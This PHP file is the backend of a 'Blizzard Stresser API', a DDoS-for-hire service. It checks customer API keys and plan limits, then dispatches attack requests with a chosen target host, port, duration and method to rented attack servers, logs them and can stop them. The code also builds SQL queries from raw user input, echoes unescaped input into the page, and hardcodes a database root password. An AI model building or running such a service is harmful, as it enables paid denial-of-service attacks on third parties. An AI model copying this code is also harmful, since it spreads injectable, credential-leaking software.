<?php

$key = $_GET['key'];
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
$vip = $_GET['vip'];
$servers = (int) $_GET['servers'];

$error = array();

$host = str_replace('https://', 'http://', $host);

if(isset($key) && isset($host) && isset($port) && isset($time) && isset($method) && $servers > 0 && $key != '0'){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT COUNT(*) FROM users WHERE apikey=:key");
	$stmt->bindParam("key", $key, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	if($result == 1){
		$parameters = array(".gov", ".edu", "$", "{", "%", "<");
		foreach ($parameters as $parameter) {
			if (strpos($host, $parameter)) {
				$error = array('type' => 'error', 'msg' => 'You are not allowed to attack these websites!');
			}
		}
		//Check if host is blacklisted
		$SQL = $db->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
		$SQL->execute(array(':host' => $host));
		$countBlacklist = $SQL->fetchColumn(0);
		if ($countBlacklist > 0) {
			$error = array('type' => 'error', 'msg' => 'Host is blacklisted!');
		}
		if(is_numeric($port) && is_numeric($time)){
			if(getMethod($method)){ //checking if method exists
			    $blockedMethods = explode(PHP_EOL, file_get_contents(__DIR__ . "/block.txt"));
				if (in_array(strtolower($method), $blockedMethods)) {
					$error = array('type' => 'error', 'msg' => 'This method is currently disabled!');
				} else {
					if($time <= getMaxTime(getPlan($key))){ //checking time in plan
						if(isVIP(getPlan($key)) == '1' && $vip == '1'){ //checking vip in plan
							//has vip and selected vip=1
							$SQLSelectAPI = $db->prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method ORDER BY RAND()");
							$SQLSelectAPI->execute(array(':method' => "%{$method}%"));
						}elseif(isVIP(getPlan($key)) == '1' && $vip == '0'){
							//has vip but selected vip=0
							$SQLSelectAPI = $db->prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
							$SQLSelectAPI->execute(array(':method' => "%{$method}%"));
						}elseif(isVIP(getPlan($key)) == '0'){
							//has not vip
							$SQLSelectAPI = $db->prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
							$SQLSelectAPI->execute(array(':method' => "%{$method}%"));
						}
						
						$avaiableApis = [];
						$planName = getPlanName(getPlan($key));
						
						while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
							$name = $show['name'];
							$count = $db->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
							
							if ($count >= $show['slots']) {
								continue;
							}
							
							$arrayFind = array('[host]', '[port]', '[time]', '[method]');
							$arrayReplace = array($host, $port, $time, $method);
							$APILink = $show['api'];
							$handler[] = $show['name'];
				  
							$avaiableApis[] = str_replace($arrayFind, $arrayReplace, $APILink);
						}
						
						$avaiableApisCount = count($avaiableApis);
						
						if ($avaiableApisCount < $servers) {
							$error = array('type' => 'error', 'msg' => 'There is no enough server available to fulfill your request!');
						}
						
						for ($i = 0; $i < $servers; $i++) {
							$apiUrl = $avaiableApis[$i];
							
							$ch = curl_init();
							curl_setopt($ch, CURLOPT_URL, $apiUrl);
							curl_setopt($ch, CURLOPT_HEADER, 0);
							curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
							curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
							curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
							curl_setopt($ch, CURLOPT_TIMEOUT, 3);
							$result = curl_exec($ch);
							curl_close($ch);
						}

						$handlers = @implode(",", $handler);
						$username = getUsername($key);
						
						addAttack($host, $port, $time, $method, $vip == 1 ? 1 : 0, $key, $handlers, $servers);
						
						$error = array('type' => 'success', 'msg' => 'Attack successfully sended!');
					}else{
						$error = array('type' => 'error', 'msg' => 'Time is too big!');
					}
				}
			}elseif($method == "STOP"){
				$user = getUsername($key);
				
				$SQLSelect = $db->query("SELECT * FROM `logs` WHERE `ip` = '$host' AND `user` = '$user'");

				while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
					$host = $show['ip'];
					$port = $show['port'];
					$time = $show['time'];
					$method2 = $show['method'];
					$handler = $show['handler'];
					$command = $db->query("SELECT `command` FROM `methods` WHERE `name` = '$method2'")->fetchColumn(0);
				}

				$handlers = explode(",", $handler);
			
				foreach ($handlers as $handler){
					
					$SQLSelectAPI = $db->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
			
					while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

						$APILink = $show['api'];

					}
					
					$arrayFind = array('[host]','[port]','[time]','[method]');
					$arrayReplace = array($host, $port, $time, $method2);
				
					$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
					$stopcommand  = "&method=STOP";
					$stopapi = $APILink . $stopcommand;
					
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $stopapi);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_TIMEOUT, 3);
					curl_exec($ch);
					curl_close($ch);
					
				}
				
				$SQL = $db->query("UPDATE `logs` SET `stopped` = 1 WHERE `ip` = '$host' AND `user` = '$user'");
		$error = array('type' => 'success', 'msg' => 'Attack successfully stopped!');
			}else{
		$error = array('type' => 'error', 'msg' => 'Method doesnt exists!');
			}
		}else{
		$error = array('type' => 'error', 'msg' => 'Check port and time!');
		}
	}else{
		$error = array('type' => 'error', 'msg' => 'API key not found!');
	}
}else{
		$error = array('type' => 'error', 'msg' => 'Check parameters!');
}

function isVIP($plan){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT vip FROM plans WHERE ID=:plan");
	$stmt->bindParam("plan", $plan, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;	
}

function getPlanName($planId){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT name FROM plans WHERE ID=:plan");
	$stmt->bindParam("plan", $planId, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;	
}

function getMaxTime($plan){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT mbt FROM plans WHERE ID=:plan");
	$stmt->bindParam("plan", $plan, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;
}

function getPlan($key){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT membership FROM users WHERE apikey=:key");
	$stmt->bindParam("key", $key, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;
}

function getMethod($method){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT COUNT(*) FROM methods WHERE name=:method");
	$stmt->bindParam("method", $method, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	if($result == 1){
		return true;
	}
	return false;
}

function getMethodFullName($method){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT fullname FROM methods WHERE name=:method");
	$stmt->bindParam("method", $method, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;
}

function addAttack($host, $port, $time, $method, $vip, $key, $handlers, $servers){
	$db = getDB('sst');
	//Insert Logs
	$chart = date("d-m");
	
	$username = getUsername($key);
	
	$insertLogSQL = $db->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), :chart, '0', :handler, :vip, :servers)");
	$insertLogSQL->execute(array(':user' => $username, ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':chart' => $chart, ':handler' => $handlers, ':vip' => $vip, ':servers' => $servers));
}

function getUsername($key){
	$db = getDB('sst');
	$stmt = $db->prepare("SELECT username FROM users WHERE apikey=:key");
	$stmt->bindParam("key", $key, PDO::PARAM_STR);
	$stmt->execute();
	$result = $stmt->fetchColumn(0);
	return $result;
}

function getDB($dbname){
	$db_host = 'localhost';
	$db_user = 'root';
	$db_password = 'd5kZ29QPnaMRYM2L';
	$db_name = $dbname;

	try{
		$pdo = new PDO("mysql:host=$db_host; dbname=$db_name", $db_user, $db_password);
		$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);
		$pdo->exec("set names utf8");
		return $pdo;
	}catch(PDOException $e){
		return $e->getMessage();
	}
}

?>

<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Blizzard Stresser API</title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
</head>
<body>
	<div class="card" style="width:50rem;">
		<div class="card-body">
			<h1 class="display-4" align="center">Blizzard Stresser API</h1>
			<?php if($error['type'] == 'error'){?>
			<div class="alert alert-danger"><i class="far fa-times-circle"></i> <?php echo $error['msg'];?></div>
			<?php }elseif($error['type'] == 'success'){?>
			<div class="alert alert-success"><i class="far fa-check-circle"></i> <?php echo $error['msg'];?></div>
			<?php }?>
			<table class="table table-light text-black">
				<tbody>
					<tr>
						<th width="15%">Target:</th>
						<td><span class="badge badge-pill badge-dark"><?php echo $host;?></span></td>
					</tr>
					<tr>
						<th width="15%">Port:</th>
						<td><span class="badge badge-pill badge-dark"><?php echo $port;?></span></td>
					</tr>
					<tr>
						<th width="15%">Time:</th>
						<td><span class="badge badge-pill badge-dark"><?php echo $time;?> seconds</span></td>
					</tr>
					<tr>
						<th width="15%">Handlers:</th>
						<td><span class="badge badge-pill badge-dark"><?php echo $handlers;?></span></td>
					</tr>
					<tr>
						<th width="15%">VIP:</th>
						<td><span class="badge badge-pill badge-dark"><?php if($vip == 1){echo "Yes";}else{echo "No";} ?></span></td>
					</tr>
					<tr>
						<th width="15%">Actions:</th>
						<td>
							<a href="https://check-host.net/check-tcp?host=<?php echo $host.':'.$port;?>" target="_blank"><i class="fas fa-caret-right"></i> Check TCP</a>
							<br><a href="https://check-host.net/check-http?host=<?php echo $host;?>" target="_blank"><i class="fas fa-caret-right"></i> Check HTTP</a>
							<br><a href="https://check-host.net/check-ping?host=<?php echo $host;?>" target="_blank"><i class="fas fa-caret-right"></i> Check ping</a>
						</td>
					</tr>
				</tbody>
			</table>
		</div>
	</div>
</body>
</html>